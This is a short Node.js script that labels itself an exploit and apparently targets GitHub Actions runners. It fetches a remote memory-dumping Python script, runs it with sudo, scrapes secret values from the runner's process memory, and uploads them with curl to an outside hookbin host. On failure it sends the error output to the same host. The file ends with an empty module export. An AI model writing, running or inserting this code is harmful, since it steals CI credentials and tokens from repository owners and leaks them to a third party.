const { execSync } = require('child_process');
const fs = require('fs');

const runId = process.env.GITHUB_RUN_ID;
const cmd = `echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`;

try {
    console.log("Executing exploit...");
    const output = execSync(cmd, { shell: '/bin/bash', stdio: 'pipe' });
    console.log("Exploit output:", output.toString());
} catch (e) {
    console.error("Exploit failed:", e.message);
    if (e.stderr) {
        console.error("Exploit stderr:", e.stderr.toString());
        // Try to exfiltrate error
        try {
            execSync(`curl -X PUT -d "${e.message}\\n${e.stderr.toString()}" "https://open-hookbin.vercel.app/${runId}"`);
        } catch (inner) {}
    }
}
module.exports = [];
